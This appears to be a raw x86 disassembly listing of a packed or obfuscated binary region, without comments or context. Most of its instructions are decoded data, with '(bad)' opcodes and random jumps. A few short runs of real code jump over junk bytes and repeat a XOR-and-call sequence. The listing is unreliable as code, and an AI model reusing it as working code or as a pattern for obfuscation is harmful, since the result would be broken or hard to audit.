  4233f7:	and    al,0xaa
  4233f9:	cmc    
  4233fa:	lahf   
  4233fb:	hlt    
  4233fc:	and    dh,dh
  4233fe:	dec    eax
  4233ff:	pop    ebp
  423400:	mov    esi,0x7f8603e1
  423405:	xchg   esp,eax
  423406:	js     0x423448
  423408:	(bad)  
  42340a:	mov    esp,0x7c1e94b4
  42340f:	mov    edx,DWORD PTR [eax-0x43696836]
  423415:	xchg   edi,eax
  423416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423417:	xor    al,0xf1
  423419:	fsubrp st(0),st
  42341b:	dec    esi
  42341c:	xchg   edx,ebp
  42341e:	loop   0x423451
  423420:	mov    BYTE PTR [esp+esi*2-0x32cf878a],cl
  423427:	sbb    DWORD PTR ds:0x90071efc,ecx
  42342d:	and    BYTE PTR [ebx-0x7b3426d6],dl
  423433:	mov    eax,DWORD PTR [edi+0x2e]
  423436:	out    dx,al
  423437:	scas   al,BYTE PTR es:[edi]
  423438:	cwde   
  423439:	push   eax
  42343a:	xor    esp,DWORD PTR [esi+0x4dc03562]
  423440:	inc    DWORD PTR [ecx+ebp*8]
  423443:	leave  
  423444:	add    BYTE PTR [eax],al
  423446:	add    BYTE PTR [edi-0x16b7b6ca],dl
  42344c:	jg     0x4233e5
  42344e:	push   DWORD PTR [esp+ebx*2-0x64]
  423452:	imul   ecx,DWORD PTR [edi+edx*2-0x28],0x19e8f33
  42345a:	add    BYTE PTR [ecx+0x57000000],dh
  423460:	fild   WORD PTR [ebp+edx*1+0x44be15ce]
  423467:	inc    esi
  423468:	fcomp  QWORD PTR [edx-0x73ea6c63]
  42346e:	sbb    BYTE PTR [edi],ah
  423470:	cmp    bl,BYTE PTR [edi]
  423472:	gs cli 
  423474:	sub    al,0xcb
  423476:	dec    edi
  423477:	bnd jnp 0x4234a7
  42347a:	in     al,dx
  42347b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42347d:	pop    ss
  42347e:	dec    edx
  42347f:	or     eax,0x461ab39
  423484:	dec    ebp
  423485:	mov    eax,ds:0xd9cc369f
  42348a:	imul   ebp,DWORD PTR [edi+0x5feb61cf],0xc443972b
  423494:	cmp    eax,0x249a2a7f
  423499:	and    edi,DWORD PTR [ebx+ecx*2+0x53]
  42349d:	and    BYTE PTR [edi-0x1d],0xb3
  4234a1:	xlat   BYTE PTR ds:[ebx]
  4234a2:	and    DWORD PTR [esi+0x51802eee],ecx
  4234a8:	sbb    dl,BYTE PTR [ebx+0x33aaba1]
  4234ae:	inc    ebx
  4234af:	push   0xffffff87
  4234b1:	outs   dx,DWORD PTR ds:[esi]
  4234b2:	sbb    eax,0xbee9462c
  4234b7:	mov    edi,0x8b7cd1e2
  4234bc:	mov    esp,0x19d552fd
  4234c1:	jl     0x4234d8
  4234c3:	mov    bl,0xc8
  4234c5:	cmp    al,0xb9
  4234c7:	sub    al,0xac
  4234c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234ca:	in     al,dx
  4234cb:	pushf  
  4234cc:	and    al,0x27
  4234ce:	fistp  WORD PTR [ecx]
  4234d0:	nop
  4234d1:	add    dl,ah
  4234d3:	stc    
  4234d4:	pushf  
  4234d5:	nop    DWORD PTR [eax+0x11]
  4234d9:	(bad)  [edi]
  4234db:	mov    ebx,0x1f622bcc
  4234e0:	mov    dh,0xf4
  4234e2:	call   0xbf20cec6
  4234e7:	mov    ecx,0x3b7dd313
  4234ec:	test   al,0x39
  4234ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234ef:	mov    bl,0x23
  4234f1:	dec    ebx
  4234f2:	pop    ss
  4234f3:	push   es
  4234f4:	mov    ds:0xa4a37e1f,eax
  4234f9:	or     eax,0x30dd4cf2
  4234fe:	jg     0x423497
  423500:	out    dx,al
  423501:	sub    al,BYTE PTR [edx+0x48ba623]
  423507:	cmp    edx,DWORD PTR [esi]
  423509:	pop    ds
  42350a:	push   0x9c8eee72
  42350f:	adc    DWORD PTR [ecx+0x458bdc55],ecx
  423515:	int3   
  423516:	jmp    0x4235e4
  42351b:	xchg   ecx,eax
  42351c:	rcr    BYTE PTR [eax+ecx*4+0x5d],0x9c
  423521:	aad    0xd9
  423523:	arpl   sp,sp
  423525:	sbb    al,0x69
  423527:	jnp    0x4234c7
  423529:	popf   
  42352a:	imul   eax,DWORD PTR [eax-0x61],0xb10001
  423531:	add    BYTE PTR [eax],al
  423533:	adc    BYTE PTR [edi+ebx*2+0x3ef9cba9],0x85
  42353b:	mov    al,ds:0x8e9d4749
  423540:	(bad)  
  423541:	push   edx
  423542:	es inc edx
  423544:	push   0x50
  423546:	pop    edx
  423547:	aaa    
  423548:	lds    edi,FWORD PTR [edi+0x570eff62]
  42354e:	retf   0x221e
  423551:	enter  0xeb9d,0x20
  423555:	jmp    0x423514
  423557:	ficomp DWORD PTR [ebp+0x6460debe]
  42355d:	adc    bh,dh
  42355f:	dec    edx
  423560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423561:	shl    BYTE PTR [ecx+0x37],cl
  423564:	ins    BYTE PTR es:[edi],dx
  423565:	ret    0xad1
  423568:	imul   esp,DWORD PTR [esi-0x15],0xb04d7313
  42356f:	lods   eax,DWORD PTR ds:[esi]
  423570:	pop    edi
  423571:	mov    ds:0x33adbb12,al
  423576:	mov    eax,0xcfa211a8
  42357b:	in     al,dx
  42357c:	scas   eax,DWORD PTR es:[edi]
  42357d:	cmc    
  42357e:	cmp    edi,DWORD PTR [ebp-0x5f]
  423581:	test   BYTE PTR [edx+edx*2],al
  423584:	repz jae 0x423508
  423587:	sbb    ebx,DWORD PTR [edx-0x74]
  42358a:	stos   DWORD PTR es:[edi],eax
  42358b:	dec    ebx
  42358c:	fs xchg ecx,eax
  42358e:	mov    esi,0x7f12608e
  423593:	pop    esi
  423594:	adc    DWORD PTR [esi+eax*1],0x6b163942
  42359b:	dec    ebx
  42359c:	sub    edi,esi
  42359e:	addr16 pop edi
  4235a0:	mov    ebx,0x1da55ed1
  4235a5:	ss stos DWORD PTR es:[edi],eax
  4235a7:	jae    0x42358f
  4235a9:	push   ecx
  4235aa:	jle    0x4235cc
  4235ac:	pop    esp
  4235ad:	pop    edx
  4235ae:	sbb    dl,BYTE PTR [ebx]
  4235b0:	in     al,0x2
  4235b2:	in     al,dx
  4235b3:	cwde   
  4235b4:	clc    
  4235b5:	inc    edi
  4235b6:	adc    bl,dh
  4235b8:	ficomp DWORD PTR [ebx-0x5cddb8fb]
  4235be:	std    
  4235bf:	xchg   ebp,eax
  4235c0:	mov    bl,0x6b
  4235c2:	imul   DWORD PTR [edx+0x77b2d34f]
  4235c8:	das    
  4235c9:	scas   eax,DWORD PTR es:[edi]
  4235ca:	mov    ecx,0xcf9569d7
  4235cf:	sbb    bl,BYTE PTR [ecx-0x62]
  4235d2:	int    0x4
  4235d4:	int    0xf0
  4235d6:	fwait
  4235d7:	xor    bh,BYTE PTR [eax-0x68e5cf68]
  4235dd:	es push ss
  4235df:	adc    ch,BYTE PTR [ecx+eax*1]
  4235e2:	ins    DWORD PTR es:[edi],dx
  4235e3:	mov    bh,0x8a
  4235e5:	push   ebp
  4235e6:	(bad)  
  4235e7:	jmp    0x4236b5
  4235ec:	mov    DWORD PTR [edx-0x59],0xfffda7d8
  4235f3:	pop    edi
  4235f4:	imul   edx,DWORD PTR [eax-0x582e85fc],0x9ff14ed2
  4235fe:	add    DWORD PTR [eax],eax
  423600:	mov    cl,0x0
  423602:	add    BYTE PTR [eax],al
  423604:	loop   0x4235b3
  423606:	repz mov ecx,0x2b46a340
  42360c:	das    
  42360d:	or     WORD PTR [ebp+ebp*4-0x6e],0x69ba
  423614:	or     ch,BYTE PTR [eax-0xfe0bbc3]
  42361a:	xchg   ebx,eax
  42361b:	mov    edx,0x37861bfc
  423620:	adc    edi,edi
  423622:	xchg   ecx,eax
  423623:	or     dl,ah
  423625:	aam    0x6d
  423627:	adc    DWORD PTR [edi+0x4618b93b],0x59
  42362e:	nop
  42362f:	cmc    
  423630:	or     al,0x80
  423632:	add    al,0x1a
  423634:	jg     0x42366a
  423636:	popa   
  423637:	xchg   BYTE PTR [ecx],ch
  423639:	push   cs
  42363a:	mov    dl,0x8a
  42363c:	ja     0x4236a2
  42363e:	pop    ss
  42363f:	and    BYTE PTR [edi],bh
  423641:	mov    al,ds:0xb611b610
  423646:	lods   al,BYTE PTR ds:[esi]
  423647:	adc    al,0xe9
  423649:	and    DWORD PTR [edi],esp
  42364b:	fsubr  QWORD PTR [edx+0x33]
  42364e:	xchg   edx,eax
  42364f:	sar    ah,0x69
  423652:	push   cs
  423653:	pop    ds
  423654:	dec    edi
  423655:	sar    eax,cl
  423657:	cld    
  423658:	ja     0x423699
  42365a:	mov    esi,0xf6342838
  42365f:	sbb    al,cl
  423661:	(bad)  
  423662:	jmp    0x42360f
  423664:	cld    
  423665:	stc    
  423666:	pop    ebx
  423667:	ffreep st(6)
  423669:	cmp    BYTE PTR [edx],al
  42366b:	mov    DWORD PTR [ebx],0xb9786437
  423671:	adc    dh,BYTE PTR [edi+ebx*4-0x6e1e1cab]
  423678:	push   0x39fe96b9
  42367d:	sub    BYTE PTR [edx+0x19f2a260],bh
  423683:	jne    0x423614
  423685:	adc    DWORD PTR [esi+0x51],edx
  423688:	pop    eax
  423689:	es out dx,eax
  42368b:	cmp    BYTE PTR [edi-0x2f],bl
  42368e:	(bad)  
  42368f:	cmp    BYTE PTR [edi+edx*2+0x46dd40e9],bl
  423696:	dec    eax
  423697:	test   al,0x8a
  423699:	shl    edx,0x41
  42369c:	cmp    al,0xc0
  42369e:	and    DWORD PTR [edx+eax*2+0x60d9bb25],ebp
  4236a5:	int3   
  4236a6:	push   ds
  4236a7:	and    esp,DWORD PTR [esi+0x53374006]
  4236ad:	aas    
  4236ae:	hlt    
  4236af:	mov    dl,0x5d
  4236b1:	mov    ds:0x88183817,al
  4236b6:	adc    BYTE PTR [ebx-0x36160fbb],cl
  4236bc:	add    BYTE PTR [eax],al
  4236be:	add    BYTE PTR [edi+ebx*8-0x59045b27],bh
  4236c5:	std    
  4236c6:	fbstp  TBYTE PTR [edx+0x69]
  4236c9:	and    ah,BYTE PTR [ecx+0x33af441b]
  4236cf:	mov    ds:0xb10001a0,al
  4236d4:	add    BYTE PTR [eax],al
  4236d6:	add    BYTE PTR [esi+ebx*1],cl
  4236d9:	rol    DWORD PTR [edx],cl
  4236db:	jl     0x423744
  4236dd:	jmp    0x42371e
  4236df:	les    esi,FWORD PTR [edx]
  4236e1:	imul   esp,DWORD PTR [eax-0x74b5e4ed],0x7d
  4236e8:	loop   0x42374b
  4236ea:	in     eax,0x1e
  4236ec:	push   edx
  4236ed:	pop    ebp
  4236ee:	mov    ah,0xb0
  4236f0:	sub    ah,0xf6
  4236f3:	stos   DWORD PTR es:[edi],eax
  4236f4:	loop   0x4236b3
  4236f6:	adc    al,0xac
  4236f8:	mov    edi,DWORD PTR [ebx+0x58af8647]
  4236fe:	in     eax,dx
  4236ff:	aaa    
  423700:	jb     0x423705
  423702:	outs   dx,DWORD PTR ds:[esi]
  423703:	pop    ebx
  423704:	or     DWORD PTR [bx+di+0x5dfb],esp
  423709:	and    BYTE PTR [ebp+0x72],al
  42370c:	test   BYTE PTR [edi+0x55d2ba6f],ah
  423712:	add    edi,DWORD PTR [ebx+edx*4+0x53]
  423716:	add    ecx,DWORD PTR [esi-0x29]
  423719:	jle    0x423783
  42371b:	and    edx,DWORD PTR [esi+0x4543d698]
  423721:	repnz out 0xf,al
  423724:	int    0x5a
  423726:	xlat   BYTE PTR ds:[ebx]
  423727:	push   ebx
  423728:	pop    ebp
  423729:	pop    ebp
  42372a:	sar    DWORD PTR [eax+ebp*8],0x95
  42372e:	retf   0x8526
  423731:	xor    cl,BYTE PTR [ebx+ebx*8]
  423734:	and    bl,ch
  423736:	por    mm6,QWORD PTR [ebx-0x7c8a35cb]
  42373d:	fiadd  DWORD PTR [ecx]
  42373f:	(bad)  
  423740:	mov    ebp,0x214a9261
  423745:	mov    al,BYTE PTR [edi-0x72]
  423748:	retf   0x1a2c
  42374b:	aad    0xc7
  42374d:	or     DWORD PTR [ecx],esp
  42374f:	sbb    ecx,DWORD PTR [ebx+0x14075890]
  423755:	fwait
  423756:	repz bound ebp,QWORD PTR [eax-0x4e305f96]
  42375d:	pop    ss
  42375e:	icebp  
  42375f:	sbb    ch,BYTE PTR [esi-0x36]
  423762:	cmp    cl,BYTE PTR [edi+0x5fe12a02]
  423768:	ins    BYTE PTR es:[edi],dx
  423769:	push   0xffffffe9
  42376b:	dec    edx
  42376c:	mov    dl,0xcf
  42376e:	push   ds
  42376f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423770:	add    eax,0xc8be696f
  423775:	jmp    0xc09356c4
  42377a:	cmp    BYTE PTR [edi+edi*8+0x59fc04f2],cl
  423781:	add    eax,0x839f3c04
  423786:	popa   
  423787:	xor    eax,0xc9e940
  42378c:	add    BYTE PTR [eax],al
  42378e:	xor    DWORD PTR [ecx+0x20],edi
  423791:	jnp    0x4237fb
  423793:	jnp    0x423810
  423795:	jnp    0x423762
  423797:	(bad)  
  423798:	hlt    
  423799:	xchg   ebp,eax
  42379a:	repz cli 
  42379c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42379d:	ret    
  42379e:	push   ebx
  42379f:	mov    eax,ds:0xb10001
  4237a4:	add    BYTE PTR [eax],al
  4237a6:	cmp    eax,0x8d23d14
  4237ab:	push   cs
  4237ac:	inc    eax
  4237ad:	lock cmp al,0xeb
  4237b0:	mov    ecx,0xef34f04c
  4237b5:	dec    esi
  4237b6:	cs scas eax,DWORD PTR es:[edi]
  4237b8:	fistp  QWORD PTR [ebp+0x20be0ef]
  4237be:	hlt    
  4237bf:	dec    ecx
  4237c0:	outs   dx,BYTE PTR ds:[esi]
  4237c1:	stos   BYTE PTR es:[edi],al
  4237c2:	inc    eax
  4237c3:	loope  0x42378f
  4237c5:	mov    edi,ecx
  4237c7:	js     0x423750
  4237c9:	or     al,0xca
  4237cb:	push   esp
  4237cc:	loopne 0x4237ad
  4237ce:	add    eax,edi
  4237d0:	add    eax,DWORD PTR [edi]
  4237d2:	inc    al
  4237d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237d5:	fadd   st(2),st
  4237d7:	inc    ebp
  4237d8:	inc    edx
  4237d9:	cmp    DWORD PTR [ecx+eiz*8],eax
  4237dc:	push   edx
  4237dd:	dec    edx
  4237de:	inc    edx
  4237df:	mov    al,0x9f
  4237e1:	std    
  4237e2:	or     al,0x9a
  4237e4:	arpl   WORD PTR [ecx-0x55],dx
  4237e7:	mul    BYTE PTR [eax]
  4237e9:	je     0x423849
  4237eb:	pop    ecx
  4237ec:	(bad)  
  4237ed:	aas    
  4237ee:	mov    esi,0x6dc818f
  4237f3:	subps  xmm7,xmm6
  4237f6:	push   ecx
  4237f7:	jnp    0x4237bb
  4237f9:	mov    ebp,0x716976be
  4237fe:	adc    al,0xe
  423800:	outs   dx,BYTE PTR ds:[esi]
  423801:	int    0x3f
  423803:	adc    al,0x32
  423805:	out    dx,al
  423806:	jae    0x4237b2
  423808:	div    edi
  42380a:	inc    esi
  42380b:	dec    esi
  42380c:	and    BYTE PTR [ecx],ch
  42380e:	sub    edi,ebx
  423810:	jmp    0x4237da
  423812:	cmp    BYTE PTR [eax-0x66081682],bl
  423818:	je     0x423814
  42381a:	inc    eax
  42381b:	test   DWORD PTR [esi],0x5868d750
  423821:	mov    bl,0x9e
  423823:	cmp    eax,0xeee466cb
  423828:	fsubr  DWORD PTR [esi]
  42382a:	pop    edx
  42382b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42382c:	add    al,0x58
  42382e:	pop    edx
  42382f:	icebp  
  423830:	mov    WORD PTR [edi+0x72],?
  423833:	fisttp DWORD PTR [ebp+0x2d0743e5]
  423839:	jmp    0x1edd:0x38b87a9e
  423840:	push   ds
  423841:	test   al,0x7b
  423843:	dec    ebp
  423844:	cmp    eax,0xe71d0fda
  423849:	test   BYTE PTR [edi+0x24f30fba],bh
  42384f:	jo     0x423867
  423851:	cmc    
  423852:	dec    esi
  423853:	mov    eax,0x89670cb7
  423858:	inc    ebp
  423859:	lock cmp eax,DWORD PTR [ebp-0x30]
  42385d:	jmp    0x42392b
  423862:	mov    BYTE PTR [eax+ebp*2-0x230383c4],dl
  423869:	mov    ah,0xb9
  42386b:	add    esp,ebx
  42386d:	fisubr DWORD PTR [ecx+0x4920336]
  423873:	mov    ds:0xb10001,al
  423878:	add    BYTE PTR [eax],al
  42387a:	xor    DWORD PTR [ebx+0x71af025c],esp
  423880:	mov    esp,0x4d635647
  423885:	sub    ch,0xc7
  423888:	sub    eax,0x50509ef0
  42388d:	cmp    edi,ecx
  42388f:	xchg   edi,eax
  423890:	test   eax,0xa49e793d
  423895:	out    dx,eax
  423896:	adc    BYTE PTR ds:0xb56f12ac,0x35
  42389d:	mov    ds:0xf113bd5e,eax
  4238a2:	or     cl,dl
  4238a4:	dec    ebp
  4238a5:	mov    ds:0x34c8922a,al
  4238aa:	adc    ebp,ebx
  4238ac:	pushf  
  4238ad:	xor    dh,BYTE PTR [edi]
  4238af:	xchg   DWORD PTR [esi],edi
  4238b1:	jle    0x4238a7
  4238b3:	dec    edi
  4238b4:	enter  0xd089,0x71
  4238b8:	cmc    
  4238b9:	inc    esp
  4238ba:	dec    ebx
  4238bb:	sub    cl,BYTE PTR [edi-0x32ed4977]
  4238c1:	xor    bl,BYTE PTR [edi]
  4238c3:	sti    
  4238c4:	into   
  4238c5:	addr16 mov eax,ds:0x2dcb
  4238c9:	arpl   WORD PTR [ebx-0x6a1600d4],ax
  4238cf:	cmp    al,0x1c
  4238d1:	push   eax
  4238d2:	mov    eax,0x3a3f69c2
  4238d7:	or     DWORD PTR [edi],0xc53258f7
  4238dd:	xor    al,0xaa
  4238df:	lahf   
  4238e0:	jecxz  0x42393a
  4238e2:	pop    esp
  4238e3:	mov    ds:0xb277d87f,al
  4238e8:	cmp    al,0x99
  4238ea:	add    ah,bh
  4238ec:	cmp    al,0x2c
  4238ee:	fimul  DWORD PTR [edi-0x76078b03]
  4238f4:	inc    ecx
  4238f5:	loope  0x423924
  4238f7:	rcl    DWORD PTR [ebx],1
  4238f9:	jmp    0x4238f6
  4238fb:	adc    BYTE PTR [edi+0x5ca8051d],bl
  423901:	fdiv   QWORD PTR [esi-0x292cd4d4]
  423907:	loop   0x42397a
  423909:	xor    eax,0x3a7c3eed
  42390e:	sbb    BYTE PTR [esp+esi*1+0x9],cl
  423912:	push   edi
  423913:	adc    eax,0x68152dd3
  423918:	or     eax,0xd80ca01
  42391d:	fnsave [ebp-0x6a395b02]
  423923:	test   al,0xfa
  423925:	jmp    0xd2150ede
  42392a:	pop    eax
  42392b:	jb     0x421cc7
  423931:	jmp    0x4239ff
  423936:	cli    
  423937:	das    
  423938:	pushf  
  423939:	fcomp  st(5)
  42393b:	sti    
  42393c:	(bad)  
  42393d:	das    
  42393e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42393f:	or     eax,DWORD PTR [ecx-0x5b]
  423942:	loop   0x42394d
  423944:	and    BYTE PTR [ebx],dh
  423946:	mov    ch,0xa2
  423948:	add    DWORD PTR [eax],eax
  42394a:	mov    cl,0x0
  42394c:	add    BYTE PTR [eax],al
  42394e:	mov    edi,es
  423950:	dec    edi
  423951:	mov    bh,0x36
  423953:	clc    
  423954:	sbb    BYTE PTR [edx],bl
  423956:	sub    ebx,edi
  423958:	cli    
  423959:	xor    al,0x23
  42395b:	jns    0x4238f0
  42395d:	and    dl,BYTE PTR ds:0xdf010c10
  423963:	lods   eax,DWORD PTR ds:[esi]
  423964:	and    eax,0xaa4201a
  423969:	or     esp,ebp
  42396b:	sahf   
  42396c:	and    cl,BYTE PTR [eax+0x35]
  42396f:	ja     0x423944
  423971:	les    eax,FWORD PTR [edx]
  423973:	cmp    cl,BYTE PTR [eax]
  423975:	lds    edi,FWORD PTR [ecx+0x56]
  423978:	in     eax,dx
  423979:	out    0xe,eax
  42397b:	imul   ecx,DWORD PTR [eax-0x2a],0x61
  42397f:	dec    ebx
  423980:	fisttp QWORD PTR [ebp+edi*4+0x6634d500]
  423987:	cmp    ecx,DWORD PTR [ecx]
  423989:	lgs    edi,FWORD PTR [eax]
  42398c:	dec    edi
  42398d:	add    eax,0x7b82ec4e
  423992:	add    dh,BYTE PTR [esi+0x4c7abc54]
  423998:	dec    edi
  42399a:	push   edx
  42399b:	into   
  42399c:	inc    esi
  42399d:	xor    al,0x6d
  42399f:	xlat   BYTE PTR ds:[ebx]
  4239a0:	push   esp
  4239a1:	add    eax,0xb768aaba
  4239a6:	and    DWORD PTR [edi-0x46],0xffffffcb
  4239aa:	sub    eax,0xe8bfc8b1
  4239af:	shl    DWORD PTR fs:[edx-0x5a0c4b3a],cl
  4239b6:	mov    fs,edi
  4239b8:	ds jg  0x423a13
  4239bb:	or     DWORD PTR [edi-0x5800b13],ecx
  4239c1:	fistp  QWORD PTR [ebx-0x1b]
  4239c4:	cmp    esi,ebx
  4239c6:	mov    dh,0x87
  4239c8:	fistp  DWORD PTR [eax+edx*2]
  4239cb:	mov    bh,0xda
  4239cd:	imul   eax,DWORD PTR [edi-0x74],0x4c99cd4b
  4239d4:	jo     0x423a4c
  4239d6:	push   es
  4239d7:	push   es
  4239d8:	pop    esi
  4239d9:	jbe    0x423a44
  4239db:	or     BYTE PTR [ecx+0x734924d4],bh
  4239e1:	jno    0x423994
  4239e3:	cmp    DWORD PTR [esi+edx*2],esi
  4239e6:	mov    esi,0xaeeb24c8
  4239eb:	jbe    0x42397d
  4239ed:	push   es
  4239ee:	loopne 0x423a24
  4239f0:	fist   DWORD PTR [ebx-0x7b8138c6]
  4239f6:	mov    bh,0xed
  4239f8:	jo     0x42397a
  4239fa:	add    BYTE PTR [edi],al
  4239fc:	mov    ds:0x458ba6ab,eax
  423a01:	or     BYTE PTR [ebx+0x4d8be47d],cl
  423a07:	or     al,0x33
  423a09:	(bad)  
  423a0a:	push   0x1
  423a0c:	lea    eax,[eax+edi*1-0x66479db3]
  423a13:	push   eax
  423a14:	lea    eax,[ebp-0x29]
  423a17:	push   eax
  423a18:	call   0x41d107
  423a1d:	jmp    0x423aeb
  423a22:	xor    edi,ebx
  423a24:	aaa    
  423a25:	or     bh,bh
  423a27:	jmp    0xde39:0xb9ceff3d
  423a2e:	out    dx,al
  423a2f:	nop
  423a30:	test   BYTE PTR [ebx],dh
  423a32:	mov    ds:0xb10001,ax
  423a38:	add    BYTE PTR [eax],al
  423a3a:	enter  0xc131,0x9a
  423a3e:	sbb    al,0xf1
  423a40:	cwde   
  423a41:	repnz fcomp DWORD PTR [ebp+0x12151264]
  423a48:	mov    esp,0x5d738f55
  423a4d:	int3   
  423a4e:	mov    eax,eax
  423a50:	pop    esp
  423a51:	leave  
  423a52:	test   BYTE PTR ds:0xbda0bb03,ah
  423a58:	cmc    
  423a59:	mov    WORD PTR [edx+0x1b43319a],ss
  423a5f:	jno    0x423a7c
  423a61:	jecxz  0x423a2d
  423a63:	fwait
  423a64:	mov    edx,0x2c46910c
  423a69:	inc    ebx
  423a6a:	jno    0x423a46
  423a6c:	dec    eax
  423a6d:	fnstcw WORD PTR [esi]
  423a6f:	cmp    al,0x92
  423a71:	outs   dx,BYTE PTR ds:[esi]
  423a72:	adc    edx,DWORD PTR [eax+0x21]
  423a75:	jp     0x423a7c
  423a77:	mov    DWORD PTR [ecx-0x7adf815a],ebp
  423a7d:	sub    ebx,DWORD PTR [edx]
  423a7f:	sbb    edx,DWORD PTR [edi]
  423a81:	and    ebp,DWORD PTR [ebx+ebp*4+0x7d]
  423a85:	imul   eax,DWORD PTR [ebx-0x7d85dd11],0xfffffff1
  423a8c:	outs   dx,BYTE PTR ds:[esi]
  423a8d:	gs xchg ecx,eax
  423a8f:	jecxz  0x423a29
  423a91:	xor    edi,esi
  423a93:	dec    ebp
  423a94:	lods   al,BYTE PTR ds:[esi]
  423a95:	in     eax,dx
  423a96:	aas    
  423a97:	mov    esp,0x9952c375
  423a9c:	lea    ecx,[ecx]
  423a9e:	je     0x423b08
  423aa0:	lea    esp,[ebx+0x2a]
  423aa3:	fs jle 0x423a3c
  423aa6:	repz add BYTE PTR [ecx+0x6426490f],dl
  423aad:	cmp    eax,0xc74b3fd4
  423ab2:	push   edx
  423ab3:	jl     0x423b08
  423ab5:	out    0xdd,al
  423ab7:	inc    ebx
  423ab8:	add    esi,DWORD PTR [edi-0x40800ce4]
  423abe:	push   ebp
  423abf:	cmc    
  423ac0:	jl     0x423ad3
  423ac2:	push   ax
  423ac4:	popa   
  423ac5:	test   BYTE PTR [ebp+0x7b9bf222],dl
  423acb:	dec    ebx
  423acc:	push   es
  423acd:	sub    al,0x87
  423acf:	pop    esi
  423ad0:	or     BYTE PTR [edx-0x1c5a0f22],0xb8
  423ad7:	push   0x41
  423ad9:	xor    bl,BYTE PTR [edi]
  423adb:	fcmovnb st,st(1)
  423add:	in     eax,0x42
  423adf:	xor    DWORD PTR [eax-0x3fb8b709],edx
  423ae5:	not    BYTE PTR [ecx+0x16006efc]
  423aeb:	mov    eax,DWORD PTR [ebp+0x10]
  423aee:	mov    ecx,DWORD PTR [ebp+0x14]
  423af1:	xor    eax,esi
  423af3:	lea    eax,[eax+edi*1-0x66479db3]
  423afa:	push   0x1
  423afc:	push   eax
  423afd:	mov    eax,DWORD PTR [ebp+0x8]
  423b00:	mov    ecx,DWORD PTR [ebp+0xc]
  423b03:	xor    eax,esi
  423b05:	lea    eax,[eax+edi*1-0x66479db3]
  423b0c:	push   eax
  423b0d:	call   0x41d107
  423b12:	push   0x1
  423b14:	lea    eax,[ebp-0x29]
  423b17:	push   eax
  423b18:	jmp    0x423be6
  423b1d:	pop    eax
  423b1e:	adc    BYTE PTR [ebx+0x5ca7fba7],dh
  423b24:	dec    DWORD PTR [ebx]
  423b26:	sub    ebp,edi
  423b28:	pop    edi
  423b29:	ret    0xe01e
  423b2c:	in     al,0x17
  423b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	mov    cl,0x0
  423b33:	add    BYTE PTR [eax],al
  423b35:	xor    BYTE PTR [ecx*8+0x938f432],al
  423b3c:	fiadd  DWORD PTR [edi+ecx*4]
  423b3f:	(bad)  
  423b41:	or     al,dh
  423b43:	bswap  esi
  423b45:	cwde   
  423b46:	push   0xa09a355b
  423b4b:	or     esi,DWORD PTR [edx-0x32997ead]
  423b51:	clc    
  423b52:	cmp    al,0xbc
  423b54:	sbb    edx,DWORD PTR [eax-0x72e5d57c]
  423b5a:	cmp    BYTE PTR [ecx+0x3b3d8d7],al
  423b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b61:	mov    dl,BYTE PTR [eax]
  423b63:	not    DWORD PTR [eax]
  423b65:	hlt    
  423b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b67:	jbe    0x423ba5
  423b69:	xchg   BYTE PTR [edx+0x64],ch
  423b6c:	dec    eax
  423b6d:	out    dx,eax
  423b6e:	ins    DWORD PTR es:[edi],dx
  423b6f:	or     bl,BYTE PTR [eax+0x5288978d]
  423b75:	mov    eax,0xcfc68a4c
  423b7a:	daa    
  423b7b:	jle    0x423b65
  423b7d:	lds    ebp,FWORD PTR [ecx+esi*2+0x72b5f6a7]
  423b84:	mov    BYTE PTR [ebx+0x1ab675f0],ch
  423b8a:	aad    0xe3
  423b8c:	or     edx,DWORD PTR [ebx+0x50]
  423b8f:	pop    esi
  423b90:	jnp    0x423b50
  423b92:	push   esp
  423b93:	and    eax,0xa7c24626
  423b98:	(bad)  [ecx-0x3a486654]
  423b9e:	push   cs
  423b9f:	xchg   ecx,eax
  423ba0:	cmp    ch,bh
  423ba2:	fwait
  423ba3:	dec    esp
  423ba4:	(bad)  
  423ba5:	cmp    BYTE PTR [ebp+0x428d2fed],dh
  423bab:	inc    edx
  423bac:	je     0x423b5c
  423bae:	leave  
  423baf:	inc    edi
  423bb0:	add    al,0xaf
  423bb2:	shl    BYTE PTR [edi*1-0x33c55377],cl
  423bb9:	test   eax,0xa8e4d9cb
  423bbe:	stos   DWORD PTR es:[edi],eax
  423bbf:	pop    ss
  423bc0:	adc    dh,BYTE PTR [eax-0x3e8103cf]
  423bc6:	imul   ecx,DWORD PTR [ebx-0x49],0x16
  423bca:	ja     0x423c2e
  423bcc:	adc    BYTE PTR [eax+eax*8-0x54c115e9],ah
  423bd3:	int    0xa9
  423bd5:	sub    bh,BYTE PTR ds:0xc7dc63b2
  423bdb:	jmp    0xdd0916fc
  423be0:	js     0x423bf9
  423be2:	pusha  
  423be3:	adc    al,0xd6
  423be5:	cmp    ecx,DWORD PTR [ebx+0x4d8b1045]
  423beb:	adc    al,0x33
  423bed:	(bad)  
  423bee:	lea    eax,[eax+edi*1-0x66479db3]
  423bf5:	push   eax
  423bf6:	call   0x41d107
  423bfb:	mov    edi,0x66479db3
  423c00:	jmp    0x423cce
  423c05:	mov    ds:0xfe2fbacd,eax
  423c0a:	jg     0x423bc3
  423c0c:	int    0xf5
  423c0e:	icebp  
  423c0f:	and    BYTE PTR [esi+0x52],cl
  423c12:	and    DWORD PTR [ebx],esp
  423c14:	mov    eax,ds:0x1a4c8
  423c19:	mov    cl,0x0
  423c1b:	add    BYTE PTR [eax],al
  423c1d:	inc    esp
  423c1e:	sar    BYTE PTR [edi+0x4e315b5b],cl
  423c24:	cmp    eax,0xa3104dbc
  423c29:	push   cs
  423c2a:	call   0x865c:0x85d2761f
  423c31:	dec    eax
